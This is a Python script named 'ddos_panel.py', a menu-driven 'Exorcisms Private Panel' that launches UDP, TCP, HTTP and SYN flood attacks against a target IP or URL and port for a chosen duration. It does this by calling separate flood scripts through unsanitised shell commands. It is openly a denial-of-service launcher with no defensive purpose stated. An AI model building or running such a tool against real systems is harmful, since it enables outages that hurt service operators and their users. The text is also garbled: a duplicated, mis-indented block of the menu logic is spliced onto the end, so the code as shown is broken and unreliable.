# ddos_panel.py

import os
import subprocess

def menu():
    print("Exorcisms Private Panel")
    print("1. UDP Flood")
    print("2. TCP Flood")
    print("3. HTTP Flood")
    print("4. SYN Flood")
    print("5. Exit")
    choice = input("Select an attack style: ")
    return choice

def udp_flood(target, port, duration):
    command = f"python udp_flood.py {target} {port} {duration}"
    subprocess.run(command, shell=True)

def tcp_flood(target, port, duration):
    command = f"python tcp_flood.py {target} {port} {duration}"
    subprocess.run(command, shell=True)

def http_flood(target, duration):
    command = f"python http_flood.py {target} {duration}"
    subprocess.run(command, shell=True)

def syn_flood(target, port, duration):
    command = f"python syn_flood.py {target} {port} {duration}"
    subprocess.run(command, shell=True)

if __name__ == "__main__":
    while True:
        choice = menu()
        if choice == '1':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            udp_flood(target, port, duration)
        elif choice == '2':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            tcp_flood(target, port, duration)
        elif choice == '3':
            target = input("Enter target URL: ")
            duration = input("Enter duration (seconds): ")
            http_flood(target, duration)
        elif choice == '4':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            syn_flood(target, port, duration)
        elif choice == '5':
            break
        else:
            print("Invalid choice. Please try again.")            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            udp_flood(target, port, duration)
        elif choice == '2':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            tcp_flood(target, port, duration)
        elif choice == '3':
            target = input("Enter target URL: ")
            duration = input("Enter duration (seconds): ")
            http_flood(target, duration)
        elif choice == '4':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            syn_flood(target, port, duration)
        elif choice == '5':
            break
        else:
            print("Invalid choice. Please try again.")
